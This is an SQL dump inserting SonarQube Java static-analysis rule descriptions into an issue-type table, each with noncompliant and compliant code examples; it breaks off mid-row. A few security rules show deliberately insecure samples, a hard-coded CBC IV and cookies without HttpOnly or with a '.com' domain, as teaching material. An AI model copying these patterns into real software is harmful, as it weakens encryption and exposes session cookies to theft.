INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3282', 'EJB interceptor exclusions should be declared as annotations', 'sonarqube', 'Code Smell', '<p>Exclusions for default interceptors can be declared either in xml or as class annotations. Since annotations are more visible to maintainers, they
are preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;assembly-descriptor&gt;
      &lt;interceptor-binding&gt;
         &lt;ejb-name&gt;MyExcludedClass&lt;/ejb-name&gt;
         &lt;exclude-default-interceptors&gt;true&lt;/exclude-default-interceptors&gt; &lt;!-- Noncompliant --&gt;
         &lt;exclude-class-interceptors&gt;true&lt;/exclude-class-interceptors&gt; &lt;!-- Noncomopliant --&gt;
         &lt;method&gt;
           &lt;method-name&gt;doTheThing&lt;/method-name&gt;
         &lt;/method&gt;
      &lt;/interceptor-binding&gt;

&lt;/assembly-descriptor&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
@ExcludeDefaultInterceptors
public class MyExcludedClass implements MessageListener
{

  @ExcludeClassInterceptors
  @ExcludeDefaultInterceptors
  public void doTheThing() {
    // ...
  }
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3305', 'Factory method injection should be used in "@Configuration" classes', 'sonarqube', 'Code Smell', '<p>When <code>@Autowired</code> is used, dependencies need to be resolved when the class is instantiated, which may cause early initialization of
beans or lead the context to look in places it shouldn''t to find the bean. To avoid this tricky issue and optimize the way the context loads,
dependencies should be requested as late as possible. That means using parameter injection instead of field injection for dependencies that are only
used in a single <code>@Bean</code> method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Configuration
public class ​FooConfiguration {

  @Autowired private ​DataSource dataSource​;  // Noncompliant

  @Bean
  public ​MyService myService() {
    return new ​MyService(this​.dataSource​);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Configuration
public class ​FooConfiguration {

 @Bean
  public ​MyService myService(DataSource dataSource) {
    return new ​MyService(dataSource);
  }
}
</pre>
<h2>Exceptions</h2>
<p>Fields used in methods that are called directly by other methods in the application (as opposed to being invoked automatically by the Spring
framework) are ignored by this rule so that direct callers don''t have to provide the dependencies themselves.</p>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3306', 'Constructor injection should be used instead of field injection', 'sonarqube', 'Bug', '<p>Field injection seems like a tidy way to get your classes what they need to do their jobs, but it''s really a <code>NullPointerException</code>
waiting to happen unless all your class constructors are <code>private</code>. That''s because any class instances that are constructed by callers,
rather than instantiated by a Dependency Injection framework compliant with the JSR-330 (Spring, Guice, ...), won''t have the ability to perform the
field injection.</p>
<p>Instead <code>@Inject</code> should be moved to the constructor and the fields required as constructor parameters.</p>
<p>This rule raises an issue when classes with non-<code>private</code> constructors (including the default constructor) use field injection.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyComponent {  // Anyone can call the default constructor

  @Inject MyCollaborator collaborator;  // Noncompliant

  public void myBusinessMethod() {
    collaborator.doSomething();  // this will fail in classes new-ed by a caller
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyComponent {

  private final MyCollaborator collaborator;

  @Inject
  public MyComponent(MyCollaborator collaborator) {
    Assert.notNull(collaborator, "MyCollaborator must not be null!");
    this.collaborator = collaborator;
  }

  public void myBusinessMethod() {
    collaborator.doSomething();
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3329', 'Cipher Block Chaining IV''s should be unpredictable', 'sonarqube', 'Vulnerability', '<p>When encrypting data with the Cipher Block Chaining (CBC) mode an Initialization Vector (IV) is used to randomize the encryption, ie under a given
key the same plaintext doesn''t always produce the same ciphertext. The IV doesn''t need to be secret but should be unpredictable to avoid
"Chosen-Plaintext Attack".</p>
<p>To generate Initialization Vectors, NIST recommends to use a secure random number generator.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyCbcClass {

  public String applyCBC(String strKey, String plainText) {
    byte[] bytesIV = "7cVgr5cbdCZVw5WY".getBytes("UTF-8");

    /* KEY + IV setting */
    IvParameterSpec iv = new IvParameterSpec(bytesIV);
    SecretKeySpec skeySpec = new SecretKeySpec(strKey.getBytes("UTF-8"), "AES");

    /* Ciphering */
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
    cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);  // Noncompliant: the IV is hard coded and thus not generated with a secure random generator
    byte[] encryptedBytes = cipher.doFinal(plainText.getBytes("UTF-8"));
    return DatatypeConverter.printBase64Binary(bytesIV)
            + ";" + DatatypeConverter.printBase64Binary(encryptedBytes);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyCbcClass {

  SecureRandom random = new SecureRandom();

  public String applyCBC(String strKey, String plainText) {
    byte[] bytesIV = new byte[16];
    random.nextBytes(bytesIV);

    /* KEY + IV setting */
    IvParameterSpec iv = new IvParameterSpec(bytesIV);
    SecretKeySpec skeySpec = new SecretKeySpec(strKey.getBytes("UTF-8"), "AES");

    /* Ciphering */
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
    cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv); // Compliant
    byte[] encryptedBytes = cipher.doFinal(plainText.getBytes("UTF-8"));
    return DatatypeConverter.printBase64Binary(bytesIV)
            + ";" + DatatypeConverter.printBase64Binary(encryptedBytes);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/329">MITRE, CWE-329</a> - CWE-329: Not Using an Unpredictable IV with CBC Mode </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/330">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#STATIC_IV">STATIC_IV</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3330', 'Creating cookies without the "HttpOnly" flag is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it''s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won''t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>
  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it''s mandatory for session /
  sensitive-security cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>If you create a security-sensitive cookie in your JAVA code:</p>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);
c.setHttpOnly(false);  // Sensitive: this sensitive cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability
</pre>
<p>By default the <a href="https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setHttpOnly(boolean)"><code>HttpOnly</code></a> flag is
set to <em>false:</em></p>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);  // Sensitive: this sensitive cookie is created with the httponly flag not defined (by default set to false) and so it can be stolen easily in case of XSS vulnerability
</pre>
<h2>Compliant Solution</h2>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);
c.setHttpOnly(true); // Compliant: this sensitive cookie is protected against theft (HttpOnly=true)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/HttpOnly">OWASP HttpOnly</a> </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">OWASP Top 10 2017 Category A7</a> - Cross-Site Scripting
  (XSS) </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/79.html">CWE-79</a> - Improper Neutralization of Input During Web Page Generation (''Cross-site
  Scripting'') </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/1004.html">CWE-1004</a> - Sensitive Cookie Without ''HttpOnly'' Flag </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE">HTTPONLY_COOKIE</a> </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3331', 'Creating cookies with broadly defined "domain" flags is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>A cookie''s domain specifies which websites should be able to read it. Left blank, browsers are supposed to only send the cookie to sites that
exactly match the sending domain. For example, if a cookie was set by <em>lovely.dream.com</em>, it should only be readable by that domain, and not by
<em>nightmare.com</em> or even <em>strange.dream.com</em>. If you want to allow sub-domain access for a cookie, you can specify it by adding a dot in
front of the cookie''s domain, like so: <em>.dream.com</em>. But cookie domains should always use at least two levels.</p>
<p>Cookie domains can be set either programmatically or via configuration. This rule raises an issue when any cookie domain is set with a single
level, as in <em>.com</em>. </p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the <code>domain</code> attribute has only one level as domain naming. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> You should check the <code>domain</code> attribute has been set and its value has more than one level of domain nanimg, like:
  <em>sonarsource.com</em> </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
Cookie myCookie = new Cookie("name", "val");
myCookie.setDomain(".com"); // Noncompliant
java.net.HttpCookie myOtherCookie = new java.net.HttpCookie("name", "val");
myOtherCookie.setDomain(".com"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Cookie myCookie = new Cookie("name", "val"); // Compliant; by default, cookies are only returned to the server that sent them.

// or

Cookie myCookie = new Cookie("name", "val");
myCookie.setDomain(".myDomain.com"); // Compliant

java.net.HttpCookie myOtherCookie = new java.net.HttpCookie("name", "val");
myOtherCookie.setDomain(".myDomain.com"); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'INFO', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3346', 'Expressions used in "assert" should not produce side effects', 'sonarqube', 'Bug', '<p>Since <code>assert</code> statements aren''t executed by default (they must be enabled with JVM flags) developers should never rely on their
execution the evaluation of any logic required for correct program function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
assert myList.remove(myList.get(0));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean removed = myList.remove(myList.get(0));
assert removed;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/mjdGBQ">CERT, EXP06-J.</a> - Expressions used in assertions must not produce side effects </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3355', 'Defined filters should be used', 'sonarqube', 'Vulnerability', '<p>Every filter defined in <code>web.xml</code> file should be used in a <code>&lt;filter-mapping&gt;</code> element. Otherwise such filters are not
invoked.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  &lt;filter&gt;
     &lt;filter-name&gt;DefinedNotUsed&lt;/filter-name&gt;
     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;
  &lt;/filter&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
  &lt;filter&gt;
     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;
     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;
  &lt;/filter&gt;

  &lt;filter-mapping&gt;
     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;
     &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
  &lt;/filter-mapping&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3358', 'Ternary operators should not be nested', 'sonarqube', 'Code Smell', '<p>Just because you <em>can</em> do something, doesn''t mean you should, and that''s the case with nested ternary operations. Nesting ternary operators
results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)
scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String getReadableStatus(Job j) {
  return j.isRunning() ? "Running" : j.hasErrors() ? "Failed" : "Succeeded";  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String getReadableStatus(Job j) {
  if (j.isRunning()) {
    return "Running";
  }
  return j.hasErrors() ? "Failed" : "Succeeded";
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3366', '"this" should not be exposed from constructors', 'sonarqube', 'Code Smell', '<p>In single-threaded environments, the use of <code>this</code> in constructors is normal, and expected. But in multi-threaded environments, it could
expose partially-constructed objects to other threads, and should be used with caution.</p>
<p>The classic example is a class with a <code>static</code> list of its instances. If the constructor stores <code>this</code> in the list, another
thread could access the object before it''s fully-formed. Even when the storage of <code>this</code> is the last instruction in the constructor,
there''s still a danger if the class is not <code>final</code>. In that case, the initialization of subclasses won''t be complete before
<code>this</code> is exposed.</p>
<p>This rule raises an issue when <code>this</code> is assigned to any globally-visible object in a constructor, and when it is passed to the method
of another object in a constructor</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Monument {

  public static final List&lt;Monument&gt; ALL_MONUMENTS = new ArrayList()&lt;&gt;;
  // ...

  public Monument(String location, ...) {
    ALL_MONUMENTS.add(this);  // Noncompliant; passed to a method of another object

    this.location = location;
    // ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores instances of assigning <code>this</code> directly to a <code>static</code> field of the same class because that case is covered
by <a href=''/coding_rules#rule_key=java%3AS3010''>S3010</a> .</p>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/iDdGBQ">CERT, TSM01-J.</a> - Do not let the this reference escape during object construction
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/vzdGBQ">CERT, TSM03-J.</a> - Do not publish partially initialized objects </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3369', 'Security constraints should be defined', 'sonarqube', 'Vulnerability', '<p>Websphere, Tomcat, and JBoss web servers allow the definition of role-based access to servlets. It may not be granular enough for your purposes,
but it''s a start, and should be used at least as a base.</p>
<p>This rule raises an issue when a <em>web.xml</em> file has no <code>&lt;security-constraint&gt;</code> elements.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/284.html">MITRE, CWE-284</a> - Improper Access Control </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3373', '"action" mappings should not have too many "forward" entries', 'sonarqube', 'Code Smell', '<p>It makes sense to handle all related actions in the same place. Thus, the same <code>&lt;action&gt;</code> might logically handle all facets of
CRUD on an entity, with no confusion in the naming about which <code>&lt;forward/&gt;</code> handles which facet. But go very far beyond that, and it
becomes difficult to maintain a transparent naming convention. </p>
<p>So to ease maintenance, this rule raises an issue when an <code>&lt;action&gt;</code> has more than the allowed number of
<code>&lt;forward/&gt;</code> tags.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 4:</p>
<pre>
&lt;action path=''/book'' type=''myapp.BookDispatchAction'' name=''form'' parameter=''method''&gt;
  &lt;forward name=''create'' path=''/WEB-INF/jsp/BookCreate.jspx'' redirect=''false''/&gt;
  &lt;forward name=''read'' path=''/WEB-INF/jsp/BookDetails'' redirect=''false''/&gt;
  &lt;forward name=''update'' path=''/WEB-INF/jsp/BookUpdate.jspx'' redirect=''false''/&gt;
  &lt;forward name=''delete'' path=''/WEB-INF/jsp/BookDelete.jspx'' redirect=''false''/&gt;
  &lt;forward name=''authorRead'' path=''WEB-INF/jsp/AuthorDetails'' redirect=''false''/&gt;  &lt;!-- Noncompliant --&gt;
&lt;/action&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;action path=''/book'' type=''myapp.BookDispatchAction'' name=''bookForm'' parameter=''method''&gt;
  &lt;forward name=''create'' path=''/WEB-INF/jsp/BookCreate.jspx'' redirect=''false''/&gt;
  &lt;forward name=''read'' path=''/WEB-INF/jsp/BookDetails'' redirect=''false''/&gt;
  &lt;forward name=''update'' path=''/WEB-INF/jsp/BookUpdate.jspx'' redirect=''false''/&gt;
  &lt;forward name=''delete'' path=''/WEB-INF/jsp/BookDelete.jspx'' redirect=''false''/&gt;
&lt;/action&gt;

&lt;action path=''/author'' type=''myapp.AuthorDispatchAction'' name=''authorForm'' parameter=''method''&gt;
  &lt;forward name=''authorRead'' path=''WEB-INF/jsp/AuthorDetails'' redirect=''false''/&gt;
&lt;/action&gt;
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3374', 'Struts validation forms should have unique names', 'sonarqube', 'Vulnerability', '<p>According to the Common Weakness Enumeration,</p>
<blockquote>
  If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the
  other. This decision might not correspond to the programmer''s expectations...
</blockquote>
<p>In such a case, it is likely that the two forms should be combined. At the very least, one should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;form-validation&gt;
  &lt;formset&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;  &lt;!-- Noncompliant --&gt;
  &lt;/formset&gt;
&lt;/form-validation&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;form-validation&gt;
  &lt;formset&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;
  &lt;/formset&gt;
&lt;/form-validation&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/102.html">MITRE, CWE-102</a> - Struts: Duplicate Validation Forms </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation">OWASP, Improper Data Validation</a> - Struts: Duplicate
  Validation Forms </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3398', '"private" methods called only by inner classes should be moved to those classes', 'sonarqube', 'Code Smell', '<p>When a <code>private</code> method is only invoked by an inner class, there''s no reason not to move it into that class. It will still have the same
access to the outer class'' members, but the outer class will be clearer and less cluttered.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Outie {
  private int i=0;

  private void increment() {  // Noncompliant
    i++;
  }

  public class Innie {
    public void doTheThing() {
      Outie.this.increment();
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Outie {
  private int i=0;

  public class Innie {
    public void doTheThing() {
      increment();
    }

    private void increment() {
      Outie.this.i++;
    }
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3400', 'Methods should not return constants', 'sonarqube', 'Code Smell', '<p>There''s no point in forcing the overhead of a method call for a method that always returns the same constant value. Even worse, the fact that a
method call must be made will likely mislead developers who call the method thinking that something more is done. Declare a constant instead. </p>
<p>This rule raises an issue if on methods that contain only one statement: the <code>return</code> of a constant value. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int getBestNumber() {
  return 12;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
static final int BEST_NUMBER = 12;
</pre>
<h2>Exceptions</h2>
<p>Methods with annotations, such as <code>@Override</code> and Spring''s <code>@RequestMapping</code>, are ignored.</p>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3414', 'Tests should be kept in a dedicated source directory', 'sonarqube', 'Code Smell', '<p>It is a good practice to isolate test classes in a separate package so that what is shipped to production is neither polluted by nor bloated with
them. Further, including unit tests in code assemblies could affect build processes.</p>
<p>This rule raises an issue when test classes are found in projects containing non-test-related code.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3415', 'Assertion arguments should be passed in the correct order', 'sonarqube', 'Code Smell', '<p>The standard assertions library methods such as <code>org.junit.Assert.assertEquals</code>, and <code>org.junit.Assert.assertSame</code> expect the
first argument to be the expected value and the second argument to be the actual value. For AssertJ, it''s the other way around, the argument of
<code>org.assertj.core.api.Assertions.assertThat</code> is the actual value, and the subsequent calls contain the expected values. Swap them, and your
test will still have the same outcome (succeed/fail when it should) but the error messages will be confusing. </p>
<p>This rule raises an issue when the actual argument to an assertions library method is a hard-coded value and the expected argument is not.</p>
<p>Supported frameworks:</p>
<ul>
  <li> JUnit4 </li>
  <li> JUnit5 </li>
  <li> <a href="https://assertj.github.io/doc/">AssertJ</a> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
org.junit.Assert.assertEquals(runner.exitCode(), 0, "Unexpected exit code");  // Noncompliant; Yields error message like: Expected:&lt;-1&gt;. Actual:&lt;0&gt;.
org.assertj.core.api.Assertions.assertThat(0).isEqualTo(runner.exitCode()); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
org.junit.Assert.assertEquals(0, runner.exitCode(), "Unexpected exit code");
org.assertj.core.api.Assertions.assertThat(runner.exitCode()).isEqualTo(0);
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3416', 'Loggers should be named for their enclosing classes', 'sonarqube', 'Code Smell', '<p>It is convention to name each class''s logger for the class itself. Doing so allows you to set up clear, communicative logger configuration. Naming
loggers by some other convention confuses configuration, and using the same class name for multiple class loggers prevents the granular configuration
of each class'' logger. Some libraries, such as SLF4J warn about this, but not all do.</p>
<p>This rule raises an issue when a logger is not named for its enclosing class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  private final static Logger LOG = LoggerFactory.getLogger(WrongClass.class);  // Noncompliant; multiple classes using same logger
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  private final static Logger LOG = LoggerFactory.getLogger(MyClass.class);
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3419', 'Group ids should follow a naming convention', 'sonarqube', 'Code Smell', '<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when the a pom''s <code>groupId</code> does not match
the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression: <code>(com|org)(.[a-z][a-z-0-9]*)+</code></p>
<pre>
&lt;project ...&gt;
  &lt;groupId&gt;myCo&lt;/groupId&gt;  &lt;!-- Noncompliant --&gt;

  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;project ...&gt;
  &lt;groupId&gt;com.myco&lt;/groupId&gt;

  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3420', 'Artifact ids should follow a naming convention', 'sonarqube', 'Code Smell', '<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a pom''s <code>artifactId</code> does not match the
provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression: <code>[a-z][a-z-0-9]+</code></p>
<pre>
&lt;project ...&gt;
  &lt;artifactId&gt;My_Project&lt;/artifactId&gt;  &lt;!-- Noncompliant --&gt;

  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;project ...&gt;
  &lt;artifactId&gt;my-project&lt;/artifactId&gt;

  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3421', 'Deprecated "${pom}" properties should not be used', 'sonarqube', 'Code Smell', '<p>Deprecated features are those that have been retained temporarily for backward compatibility, but which will eventually be removed. In effect,
deprecation announces a grace period to allow the smooth transition from the old features to the new ones. In that period, no use of the deprecated
features should be added, and all existing uses should be gradually removed.</p>
<p>This rule raises an issue when <code>${pom.*}</code> properties are used in a pom.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  &lt;build&gt;
    &lt;finalName&gt;${pom.artifactId}-${pom.version}&lt;/finalName&gt;  &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
  &lt;build&gt;
    &lt;finalName&gt;${project.artifactId}-${project.version}&lt;/finalName&gt;
</pre>
<p>or</p>
<pre>
  &lt;build&gt;
    &lt;finalName&gt;${artifactId}-${version}&lt;/finalName&gt;
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3422', 'Dependencies should not have "system" scope', 'sonarqube', 'Bug', '<p><code>system</code> dependencies are sought at a specific, specified path. This drastically reduces portability because if you deploy your artifact
in an environment that''s not configured just like yours is, your code won''t work. </p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;dependency&gt;
  &lt;groupId&gt;javax.sql&lt;/groupId&gt;
  &lt;artifactId&gt;jdbc-stdext&lt;/artifactId&gt;
  &lt;version&gt;2.0&lt;/version&gt;
  &lt;scope&gt;system&lt;/scope&gt;  &lt;!-- Noncompliant --&gt;
  &lt;systemPath&gt;/usr/bin/lib/rt.jar&lt;/systemPath&gt;  &lt;!-- remove this --&gt;
&lt;/dependency&gt;
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3423', 'pom elements should be in the recommended order', 'sonarqube', 'Code Smell', '<p>The POM Code Convention is the Maven project''s internal recommendation for POM element ordering. It calls for listing modifiers in the following
order:</p>
<ol>
  <li> &lt;modelVersion/&gt; </li>
  <li> &lt;parent/&gt; </li>
  <li> &lt;groupId/&gt; </li>
  <li> &lt;artifactId/&gt; </li>
  <li> &lt;version/&gt; </li>
  <li> &lt;packaging/&gt; </li>
  <li> &lt;name/&gt; </li>
  <li> &lt;description/&gt; </li>
  <li> &lt;url/&gt; </li>
  <li> &lt;inceptionYear/&gt; </li>
  <li> &lt;organization/&gt; </li>
  <li> &lt;licenses/&gt; </li>
  <li> &lt;developers/&gt; </li>
  <li> &lt;contributors/&gt; </li>
  <li> &lt;mailingLists/&gt; </li>
  <li> &lt;prerequisites/&gt; </li>
  <li> &lt;modules/&gt; </li>
  <li> &lt;scm/&gt; </li>
  <li> &lt;issueManagement/&gt; </li>
  <li> &lt;ciManagement/&gt; </li>
  <li> &lt;distributionManagement/&gt; </li>
  <li> &lt;properties/&gt; </li>
  <li> &lt;dependencyManagement/&gt; </li>
  <li> &lt;dependencies/&gt; </li>
  <li> &lt;repositories/&gt; </li>
  <li> &lt;pluginRepositories/&gt; </li>
  <li> &lt;build/&gt; </li>
  <li> &lt;reporting/&gt; </li>
  <li> &lt;profiles/&gt; </li>
</ol>
<p>Not following this convention has no technical impact, but will reduce the pom''s readability because most developers are used to the standard
order.</p>
<h2>See</h2>
<ul>
